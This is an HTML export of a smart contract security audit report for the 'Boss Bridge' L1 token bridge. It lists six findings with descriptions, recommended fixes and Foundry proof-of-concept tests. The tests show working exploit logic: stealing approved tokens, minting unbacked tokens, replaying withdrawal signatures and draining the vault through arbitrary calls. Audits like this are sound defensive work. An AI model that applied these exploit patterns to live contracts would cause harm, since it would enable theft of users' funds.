@@ -1,0 +1,797 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>2023-09-01-boss-bridge-audit.md</title>
+<meta http-equiv="Content-type" content="text/html;charset=UTF-8">
+
+<style>
+/* https://github.com/microsoft/vscode/blob/master/extensions/markdown-language-features/media/markdown.css */
+/*---------------------------------------------------------------------------------------------
+ *  Copyright (c) Microsoft Corporation. All rights reserved.
+ *  Licensed under the MIT License. See License.txt in the project root for license information.
+ *--------------------------------------------------------------------------------------------*/
+
+body {
+	font-family: var(--vscode-markdown-font-family, -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif);
+	font-size: var(--vscode-markdown-font-size, 14px);
+	padding: 0 26px;
+	line-height: var(--vscode-markdown-line-height, 22px);
+	word-wrap: break-word;
+}
+
+#code-csp-warning {
+	position: fixed;
+	top: 0;
+	right: 0;
+	color: white;
+	margin: 16px;
+	text-align: center;
+	font-size: 12px;
+	font-family: sans-serif;
+	background-color:#444444;
+	cursor: pointer;
+	padding: 6px;
+	box-shadow: 1px 1px 1px rgba(0,0,0,.25);
+}
+
+#code-csp-warning:hover {
+	text-decoration: none;
+	background-color:#007acc;
+	box-shadow: 2px 2px 2px rgba(0,0,0,.25);
+}
+
+body.scrollBeyondLastLine {
+	margin-bottom: calc(100vh - 22px);
+}
+
+body.showEditorSelection .code-line {
+	position: relative;
+}
+
+body.showEditorSelection .code-active-line:before,
+body.showEditorSelection .code-line:hover:before {
+	content: "";
+	display: block;
+	position: absolute;
+	top: 0;
+	left: -12px;
+	height: 100%;
+}
+
+body.showEditorSelection li.code-active-line:before,
+body.showEditorSelection li.code-line:hover:before {
+	left: -30px;
+}
+
+.vscode-light.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.15);
+}
+
+.vscode-light.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.40);
+}
+
+.vscode-light.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-dark.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.4);
+}
+
+.vscode-dark.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.60);
+}
+
+.vscode-dark.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-high-contrast.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 160, 0, 0.7);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 160, 0, 1);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+img {
+	max-width: 100%;
+	max-height: 100%;
+}
+
+a {
+	text-decoration: none;
+}
+
+a:hover {
+	text-decoration: underline;
+}
+
+a:focus,
+input:focus,
+select:focus,
+textarea:focus {
+	outline: 1px solid -webkit-focus-ring-color;
+	outline-offset: -1px;
+}
+
+hr {
+	border: 0;
+	height: 2px;
+	border-bottom: 2px solid;
+}
+
+h1 {
+	padding-bottom: 0.3em;
+	line-height: 1.2;
+	border-bottom-width: 1px;
+	border-bottom-style: solid;
+}
+
+h1, h2, h3 {
+	font-weight: normal;
+}
+
+table {
+	border-collapse: collapse;
+}
+
+table > thead > tr > th {
+	text-align: left;
+	border-bottom: 1px solid;
+}
+
+table > thead > tr > th,
+table > thead > tr > td,
+table > tbody > tr > th,
+table > tbody > tr > td {
+	padding: 5px 10px;
+}
+
+table > tbody > tr + tr > td {
+	border-top: 1px solid;
+}
+
+blockquote {
+	margin: 0 7px 0 5px;
+	padding: 0 16px 0 10px;
+	border-left-width: 5px;
+	border-left-style: solid;
+}
+
+code {
+	font-family: Menlo, Monaco, Consolas, "Droid Sans Mono", "Courier New", monospace, "Droid Sans Fallback";
+	font-size: 1em;
+	line-height: 1.357em;
+}
+
+body.wordWrap pre {
+	white-space: pre-wrap;
+}
+
+pre:not(.hljs),
+pre.hljs code > div {
+	padding: 16px;
+	border-radius: 3px;
+	overflow: auto;
+}
+
+pre code {
+	color: var(--vscode-editor-foreground);
+	tab-size: 4;
+}
+
+/** Theming */
+
+.vscode-light pre {
+	background-color: rgba(220, 220, 220, 0.4);
+}
+
+.vscode-dark pre {
+	background-color: rgba(10, 10, 10, 0.4);
+}
+
+.vscode-high-contrast pre {
+	background-color: rgb(0, 0, 0);
+}
+
+.vscode-high-contrast h1 {
+	border-color: rgb(0, 0, 0);
+}
+
+.vscode-light table > thead > tr > th {
+	border-color: rgba(0, 0, 0, 0.69);
+}
+
+.vscode-dark table > thead > tr > th {
+	border-color: rgba(255, 255, 255, 0.69);
+}
+
+.vscode-light h1,
+.vscode-light hr,
+.vscode-light table > tbody > tr + tr > td {
+	border-color: rgba(0, 0, 0, 0.18);
+}
+
+.vscode-dark h1,
+.vscode-dark hr,
+.vscode-dark table > tbody > tr + tr > td {
+	border-color: rgba(255, 255, 255, 0.18);
+}
+
+</style>
+
+<style>
+/* Tomorrow Theme */
+/* http://jmblog.github.com/color-themes-for-google-code-highlightjs */
+/* Original theme - https://github.com/chriskempson/tomorrow-theme */
+
+/* Tomorrow Comment */
+.hljs-comment,
+.hljs-quote {
+	color: #8e908c;
+}
+
+/* Tomorrow Red */
+.hljs-variable,
+.hljs-template-variable,
+.hljs-tag,
+.hljs-name,
+.hljs-selector-id,
+.hljs-selector-class,
+.hljs-regexp,
+.hljs-deletion {
+	color: #c82829;
+}
+
+/* Tomorrow Orange */
+.hljs-number,
+.hljs-built_in,
+.hljs-builtin-name,
+.hljs-literal,
+.hljs-type,
+.hljs-params,
+.hljs-meta,
+.hljs-link {
+	color: #f5871f;
+}
+
+/* Tomorrow Yellow */
+.hljs-attribute {
+	color: #eab700;
+}
+
+/* Tomorrow Green */
+.hljs-string,
+.hljs-symbol,
+.hljs-bullet,
+.hljs-addition {
+	color: #718c00;
+}
+
+/* Tomorrow Blue */
+.hljs-title,
+.hljs-section {
+	color: #4271ae;
+}
+
+/* Tomorrow Purple */
+.hljs-keyword,
+.hljs-selector-tag {
+	color: #8959a8;
+}
+
+.hljs {
+	display: block;
+	overflow-x: auto;
+	color: #4d4d4c;
+	padding: 0.5em;
+}
+
+.hljs-emphasis {
+	font-style: italic;
+}
+
+.hljs-strong {
+	font-weight: bold;
+}
+</style>
+
+<style>
+/*
+ * Markdown PDF CSS
+ */
+
+ body {
+	font-family: -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif, "Meiryo";
+	padding: 0 12px;
+}
+
+pre {
+	background-color: #f8f8f8;
+	border: 1px solid #cccccc;
+	border-radius: 3px;
+	overflow-x: auto;
+	white-space: pre-wrap;
+	overflow-wrap: break-word;
+}
+
+pre:not(.hljs) {
+	padding: 23px;
+	line-height: 19px;
+}
+
+blockquote {
+	background: rgba(127, 127, 127, 0.1);
+	border-color: rgba(0, 122, 204, 0.5);
+}
+
+.emoji {
+	height: 1.4em;
+}
+
+code {
+	font-size: 14px;
+	line-height: 19px;
+}
+
+/* for inline code */
+:not(pre):not(.hljs) > code {
+	color: #C9AE75; /* Change the old color so it seems less like an error */
+	font-size: inherit;
+}
+
+/* Page Break : use <div class="page"/> to insert page break
+-------------------------------------------------------- */
+.page {
+	page-break-after: always;
+}
+
+</style>
+
+<script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
+</head>
+<body>
+  <script>
+    mermaid.initialize({
+      startOnLoad: true,
+      theme: document.body.classList.contains('vscode-dark') || document.body.classList.contains('vscode-high-contrast')
+          ? 'dark'
+          : 'default'
+    });
+  </script>
+<div align="center">
+<p><img src="./logo.png" alt="Bellum Galaxy"></p>
+</div>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+<h1 id="table-of-contents">Table of contents</h1>
+<details>
+<summary>See table</summary>
+<ul>
+<li><a href="#table-of-contents">Table of contents</a></li>
+<li><a href="#about-barba">About Barba</a></li>
+<li><a href="#disclaimer">Disclaimer</a></li>
+<li><a href="#risk-classification">Risk Classification</a></li>
+<li><a href="#protocol-summary">Protocol Summary</a></li>
+<li><a href="#audit-details">Audit Details</a>
+<ul>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#roles">Roles</a></li>
+</ul>
+</li>
+<li><a href="#executive-summary">Executive Summary</a>
+<ul>
+<li><a href="#issues-found">Issues found</a></li>
+</ul>
+</li>
+<li><a href="#findings">Findings</a>
+<ul>
+<li><a href="#high-severity-vulnerabilities">High Severity Vulnerabilities</a>
+<ul>
+<li><a href="#anyone-can-move-users-tokens-that-approved-the-bridge">Anyone can move users' tokens that approved the bridge</a></li>
+<li><a href="#anyone-might-mint-unbacked-tokens">Anyone might mint unbacked tokens</a></li>
+<li><a href="#all-funds-can-be-stolen-by-replaying-withdrawals">All funds can be stolen by replaying withdrawals</a></li>
+<li><a href="#all-funds-can-be-stolen-by-calling-the-vault-from-the-bridge">All funds can be stolen by calling the vault from the bridge</a></li>
+</ul>
+</li>
+<li><a href="#medium-severity-vulnerabilities">Medium Severity Vulnerabilities</a>
+<ul>
+<li><a href="#withdrawals-are-prone-to-unbounded-gas-consumption-due-to-return-bombs">Withdrawals are prone to unbounded gas consumption due to return bombs</a></li>
+</ul>
+</li>
+<li><a href="#low">Low</a>
+<ul>
+<li><a href="#lack-of-event-emission-during-withdrawals">Lack of event emission during withdrawals</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</details>
+</br>
+<h1 id="about-barba">About Barba</h1>
+<p>Solidity Developer, Security Researcher, Founder of Bellum Galaxy and Chainlink Advocate. With three months of programming experience I developed a Top Quality Project at Chainlink Constellation Hackathon. In my first competitive audit, I achieved a Top 5 position.
+I am a competitive person who daily fights for improvement. Driven by this way of thinking I founded Bellum Galaxy, a educacional community focused on science and technology to help people face life challeges, and grow personally and professionally.</p>
+<h1 id="disclaimer">Disclaimer</h1>
+<p>Solidity Developer, Security Researcher, Founder of Bellum Galaxy, and Chainlink Advocate. With three months of programming experience, I developed a Top Quality Project at Chainlink Constellation Hackathon. In my first competitive audit, I achieved a Top 5 position.
+I am a competitive person who daily fights for improvement. Driven by this way of thinking I founded Bellum Galaxy, an educational community focused on science and technology to help people face life challenges and grow personally and professionally.</p>
+<h1 id="risk-classification">Risk Classification</h1>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+<th>Impact</th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td>High</td>
+<td>Medium</td>
+<td>Low</td>
+</tr>
+<tr>
+<td></td>
+<td>High</td>
+<td>H</td>
+<td>H/M</td>
+<td>M</td>
+</tr>
+<tr>
+<td>Likelihood</td>
+<td>Medium</td>
+<td>H/M</td>
+<td>M</td>
+<td>M/L</td>
+</tr>
+<tr>
+<td></td>
+<td>Low</td>
+<td>M</td>
+<td>M/L</td>
+<td>L</td>
+</tr>
+</tbody>
+</table>
+<h1 id="protocol-summary">Protocol Summary</h1>
+<p>The Boss Bridge is a bridging mechanism to move an ERC20 token (the &quot;Boss Bridge Token&quot; or &quot;BBT&quot;) from L1 to an L2 the development team claims to be building. Because the L2 part of the bridge is under construction, it was not included in the reviewed codebase.</p>
+<p>The bridge is intended to allow users to deposit tokens, which are to be held in a vault contract on L1. Successful deposits should trigger an event that an off-chain mechanism is in charge of detecting to mint the corresponding tokens on the L2 side of the bridge.</p>
+<p>Withdrawals must be approved operators (or &quot;signers&quot;). Essentially they are expected to be one or more off-chain services where users request withdrawals, and that should verify requests before signing the data users must use to withdraw their tokens. It's worth highlighting that there's little-to-no on-chain mechanism to verify withdrawals, other than the operator's signature. So the Boss Bridge heavily relies on having robust, reliable and always available operators to approve withdrawals. Any rogue operator or compromised signing key may put at risk the entire protocol.</p>
+<h1 id="audit-details">Audit Details</h1>
+<ul>
+<li><strong>Project Name:</strong>
+<ul>
+<li>BossBridge</li>
+</ul>
+</li>
+<li><strong>Smart Contract Address:</strong>
+<ul>
+<li>Not deployed</li>
+</ul>
+</li>
+<li><strong>Audit Date:</strong>
+<ul>
+<li>03/03/2024
+<strong>The findings described in this document correspond the following commit hash:</strong></li>
+</ul>
+</li>
+</ul>
+<pre class="hljs"><code><div>026da6e73fde0dd0a650d623d0411547e3188909
+</div></code></pre>
+<h2 id="scope">Scope</h2>
+<pre class="hljs"><code><div>#-- src
+|   #-- L1BossBridge.sol
+|   #-- L1Token.sol
+|   #-- L1Vault.sol
+|   #-- TokenFactory.sol
+</div></code></pre>
+<h2 id="roles">Roles</h2>
+<ul>
+<li>Bridge owner: can pause and unpause withdrawals in the <code>L1BossBridge</code> contract. Also, can add and remove operators. Rogue owners or compromised keys may put at risk all bridge funds.</li>
+<li>User: Accounts that hold BBT tokens and use the <code>L1BossBridge</code> contract to deposit and withdraw them.</li>
+<li>Operator: Accounts approved by the bridge owner that can sign withdrawal operations. Rogue operators or compromised keys may put at risk all bridge funds.</li>
+</ul>
+<h1 id="executive-summary">Executive Summary</h1>
+<h2 id="issues-found">Issues found</h2>
+<table>
+<thead>
+<tr>
+<th>Severity</th>
+<th>Number of issues found</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>High</td>
+<td>4</td>
+</tr>
+<tr>
+<td>Medium</td>
+<td>1</td>
+</tr>
+<tr>
+<td>Low</td>
+<td>1</td>
+</tr>
+<tr>
+<td>Info</td>
+<td>0</td>
+</tr>
+<tr>
+<td>Gas</td>
+<td>0</td>
+</tr>
+<tr>
+<td>Total</td>
+<td>6</td>
+</tr>
+</tbody>
+</table>
+<h1 id="findings">Findings</h1>
+<h2 id="high-severity-vulnerabilities">High Severity Vulnerabilities</h2>
+<h3 id="anyone-can-move-users-tokens-that-approved-the-bridge">Anyone can move users' tokens that approved the bridge</h3>
+<ul>
+<li>
+<p><strong>Description:</strong></p>
+<ul>
+<li>The <code>depositTokensToL2</code> function allows anyone to call it with a <code>from</code> address of any account that has approved tokens to the bridge.</li>
+</ul>
+</li>
+<li>
+<p><strong>Impact:</strong></p>
+<ul>
+<li>As a consequence, an attacker can move tokens out of any victim account whose token allowance to the bridge is greater than zero. This will move the tokens into the bridge vault, and assign them to the attacker's address in L2 (setting an attacker-controlled address in the <code>l2Recipient</code> parameter).</li>
+</ul>
+</li>
+<li>
+<p><strong>Proof of Concept:</strong></p>
+  <details>
+  <summary>Add the code below in the `L1BossBridge.t.sol` file</summary>
+<pre class="hljs"><code><div>    function testCanMoveApprovedTokensOfOtherUsers() public {
+        vm.prank(user);
+        token.approve(address(tokenBridge), type(uint256).max);
+
+        uint256 depositAmount = token.balanceOf(user);
+        vm.startPrank(attacker);
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(user, attackerInL2, depositAmount);
+        tokenBridge.depositTokensToL2(user, attackerInL2, depositAmount);
+
+        assertEq(token.balanceOf(user), 0);
+        assertEq(token.balanceOf(address(vault)), depositAmount);
+        vm.stopPrank();
+    }
+</div></code></pre>
+  </details>
+</li>
+<li>
+<p><strong>Recommendation:</strong></p>
+  <details>
+  <summary>Adjust the code as follows</summary>
+<pre class="hljs"><code><div><span class="hljs-deletion">- function depositTokensToL2(address from, address l2Recipient, uint256 amount) external whenNotPaused {</span>
+<span class="hljs-addition">+ function depositTokensToL2(address l2Recipient, uint256 amount) external whenNotPaused {</span>
+    if (token.balanceOf(address(vault)) + amount &gt; DEPOSIT_LIMIT) {
+        revert L1BossBridge__DepositLimitReached();
+    }
+<span class="hljs-deletion">-   token.transferFrom(from, address(vault), amount);</span>
+<span class="hljs-addition">+   token.transferFrom(msg.sender, address(vault), amount);</span>
+
+    // Our off-chain service picks up this event and mints the corresponding tokens on L2
+<span class="hljs-deletion">-   emit Deposit(from, l2Recipient, amount);</span>
+<span class="hljs-addition">+   emit Deposit(msg.sender, l2Recipient, amount);</span>
+}
+</div></code></pre>
+  </details>
+</li>
+</ul>
+<h3 id="anyone-might-mint-unbacked-tokens">Anyone might mint unbacked tokens</h3>
+<ul>
+<li>
+<p><strong>Description:</strong></p>
+<ul>
+<li>As explained in the H-1 issue, the <code>depositTokensToL2</code> function allows the caller to specify the <code>from</code> address, from which tokens are taken.</li>
+</ul>
+</li>
+<li>
+<p><strong>Impact:</strong></p>
+<ul>
+<li>Because the vault grants infinite approval to the bridge already (as can be seen in the contract's constructor), it's possible for an attacker to call the <code>depositTokensToL2</code> function and transfer tokens from the vault to the vault itself. This would allow the attacker to trigger the <code>Deposit</code> event any number of times, presumably causing the minting of unbacked tokens in L2.</li>
+</ul>
+</li>
+<li>
+<p><strong>Proof of Concept:</strong></p>
+  <details>
+  <summary>Add the code below in the `L1TokenBridge.t.sol` file</summary>
+<pre class="hljs"><code><div>function testCanTransferFromVaultToVault() public {
+    vm.startPrank(attacker);
+
+    uint256 vaultBalance = 500 ether;
+    deal(address(token), address(vault), vaultBalance);
+
+    vm.expectEmit(address(tokenBridge));
+    emit Deposit(address(vault), address(vault), vaultBalance);
+    tokenBridge.depositTokensToL2(address(vault), address(vault), vaultBalance);
+
+    vm.expectEmit(address(tokenBridge));
+    emit Deposit(address(vault), address(vault), vaultBalance);
+    tokenBridge.depositTokensToL2(address(vault), address(vault), vaultBalance);
+
+    vm.stopPrank();
+}
+</div></code></pre>
+  </details>
+</li>
+<li>
+<p><strong>Recommendation:</strong></p>
+<ul>
+<li>As suggested in the previous finding, consider modifying the <code>depositTokensToL2</code> function so that the caller cannot specify a <code>from</code> address.</li>
+</ul>
+</li>
+</ul>
+<h3 id="all-funds-can-be-stolen-by-replaying-withdrawals">All funds can be stolen by replaying withdrawals</h3>
+<ul>
+<li>
+<p><strong>Description:</strong></p>
+<ul>
+<li>Users who want to withdraw tokens from the bridge can call the <code>sendToL1</code> function, or the wrapper <code>withdrawTokensToL1</code> function. These functions require the caller to send along some withdrawal data signed by one of the approved bridge operators.</li>
+</ul>
+</li>
+<li>
+<p><strong>Impact:</strong></p>
+<ul>
+<li>However, the signatures do not include any kind of replay-protection mechanisn (e.g., nonces). Therefore, valid signatures from any  bridge operator can be reused by any attacker to continue executing withdrawals until the vault is completely drained.</li>
+</ul>
+</li>
+<li>
+<p><strong>Proof of Concept:</strong></p>
+  <details>
+  <summary>Add the code below in the `L1TokenBridge.t.sol` file</summary>
+<pre class="hljs"><code><div>function testCanReplayWithdrawals() public {
+    uint256 vaultInitialBalance = 1000e18;
+    uint256 attackerInitialBalance = 100e18;
+    deal(address(token), address(vault), vaultInitialBalance);
+    deal(address(token), address(attacker), attackerInitialBalance);
+
+    vm.startPrank(attacker);
+    token.approve(address(tokenBridge), type(uint256).max);
+    tokenBridge.depositTokensToL2(attacker, attackerInL2, attackerInitialBalance);
+
+    (uint8 v, bytes32 r, bytes32 s) =
+        _signMessage(_getTokenWithdrawalMessage(attacker, attackerInitialBalance), operator.key);
+
+    while (token.balanceOf(address(vault)) &gt; 0) {
+        tokenBridge.withdrawTokensToL1(attacker, attackerInitialBalance, v, r, s);
+    }
+    assertEq(token.balanceOf(address(attacker)), attackerInitialBalance + vaultInitialBalance);
+    assertEq(token.balanceOf(address(vault)), 0);
+}
+
+</div></code></pre>
+  </details>
+</li>
+<li>
+<p><strong>Recommendation:</strong></p>
+<ul>
+<li>Consider redesigning the withdrawal mechanism so that it includes replay protection.</li>
+</ul>
+</li>
+</ul>
+<h3 id="all-funds-can-be-stolen-by-calling-the-vault-from-the-bridge">All funds can be stolen by calling the vault from the bridge</h3>
+<ul>
+<li>
+<p><strong>Description:</strong></p>
+<ul>
+<li>The <code>L1BossBridge</code> contract includes the <code>sendToL1</code> function that, if called with a valid signature by an operator, can execute arbitrary low-level calls to any given target. Because there's no restrictions neither on the target nor the calldata, this call could be used by an attacker to execute sensitive contracts of the bridge. For example, the <code>L1Vault</code> contract.</li>
+</ul>
+</li>
+<li>
+<p><strong>Impact:</strong></p>
+<ul>
+<li>The <code>L1BossBridge</code> contract owns the <code>L1Vault</code> contract. Therefore, an attacker could submit a call that targets the vault and executes is <code>approveTo</code> function, passing an attacker-controlled address to increase its allowance. This would then allow the attacker to completely drain the vault.</li>
+</ul>
+</li>
+<li>
+<p>It's worth noting that this attack's likelihood depends on the level of sophistication of the off-chain validations implemented by the operators that approve and sign withdrawals. However, we're rating it as a High severity issue because, according to the available documentation, the only validation made by off-chain services is that &quot;the account submitting the withdrawal has first originated a successful deposit in the L1 part of the bridge&quot;. As the next PoC shows, such validation is not enough to prevent the attack.</p>
+</li>
+<li>
+<p><strong>Proof of Concept:</strong></p>
+  <details>
+  <summary>Add the following code in the `L1BossBridge.t.sol` file</summary>
+<pre class="hljs"><code><div><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">testCanCallVaultApproveFromBridgeAndDrainVault</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>{
+    uint256 vaultInitialBalance = <span class="hljs-number">1000e18</span>;
+    deal(address(token), address(vault), vaultInitialBalance);
+
+    <span class="hljs-comment">// An attacker deposits tokens to L2. We do this under the assumption that the</span>
+    <span class="hljs-comment">// bridge operator needs to see a valid deposit tx to then allow us to request a withdrawal.</span>
+    vm.startPrank(attacker);
+    vm.expectEmit(address(tokenBridge));
+    emit Deposit(address(attacker), address(<span class="hljs-number">0</span>), <span class="hljs-number">0</span>);
+    tokenBridge.depositTokensToL2(attacker, address(<span class="hljs-number">0</span>), <span class="hljs-number">0</span>);
+
+    <span class="hljs-comment">// Under the assumption that the bridge operator doesn't validate bytes being signed</span>
+    bytes memory message = abi.encode(
+        address(vault), <span class="hljs-comment">// target</span>
+        <span class="hljs-number">0</span>, <span class="hljs-comment">// value</span>
+        abi.encodeCall(L1Vault.approveTo, (address(attacker), type(uint256).max)) <span class="hljs-comment">// data</span>
+    );
+    (uint8 v, bytes32 r, bytes32 s) = _signMessage(message, operator.key);
+
+    tokenBridge.sendToL1(v, r, s, message);
+    assertEq(token.allowance(address(vault), attacker), type(uint256).max);
+    token.transferFrom(address(vault), attacker, token.balanceOf(address(vault)));
+}
+</div></code></pre>
+  </details>
+</li>
+<li>
+<p><strong>Recommendation:</strong></p>
+<ul>
+<li>Consider disallowing attacker-controlled external calls to sensitive components of the bridge, such as the <code>L1Vault</code> contract.</li>
+</ul>
+</li>
+</ul>
+<h2 id="medium-severity-vulnerabilities">Medium Severity Vulnerabilities</h2>
+<h3 id="withdrawals-are-prone-to-unbounded-gas-consumption-due-to-return-bombs">Withdrawals are prone to unbounded gas consumption due to return bombs</h3>
+<ul>
+<li><strong>Description:</strong>
+<ul>
+<li>During withdrawals, the L1 part of the bridge executes a low-level call to an arbitrary target passing all available gas. While this would work fine for regular targets, it may not for adversarial ones.</li>
+</ul>
+</li>
+<li><strong>Impact:</strong>
+<ul>
+<li>In particular, a malicious target may drop a <a href="https://github.com/nomad-xyz/ExcessivelySafeCall">return bomb</a> to the caller. This would be done by returning an large amount of returndata in the call, which Solidity would copy to memory, thus increasing gas costs due to the expensive memory operations. Callers unaware of this risk may not set the transaction's gas limit sensibly, and therefore be tricked to spent more ETH than necessary to execute the call.</li>
+</ul>
+</li>
+<li><strong>Proof of Concept:</strong></li>
+<li><strong>Recommendation:</strong>
+<ul>
+<li>If the external call's returndata is not to be used, then consider modifying the call to avoid copying any of the data. This can be done in a custom implementation, or reusing external libraries such as <a href="https://github.com/nomad-xyz/ExcessivelySafeCall">this one</a>.</li>
+</ul>
+</li>
+</ul>
+<h2 id="low">Low</h2>
+<h3 id="lack-of-event-emission-during-withdrawals">Lack of event emission during withdrawals</h3>
+<ul>
+<li><strong>Description:</strong>
+<ul>
+<li>Neither the <code>sendToL1</code> function nor the <code>withdrawTokensToL1</code> function emit an event when a withdrawal operation is successfully executed.</li>
+</ul>
+</li>
+<li><strong>Impact:</strong>
+<ul>
+<li>This prevents off-chain monitoring mechanisms to monitor withdrawals and raise alerts on suspicious scenarios.</li>
+</ul>
+</li>
+<li><strong>Proof of Concept:</strong></li>
+<li><strong>Recommendation:</strong>
+<ul>
+<li>Modify the <code>sendToL1</code> function to include a new event that is always emitted upon completing withdrawals.</li>
+</ul>
+</li>
+</ul>
+
+</body>
+</html>
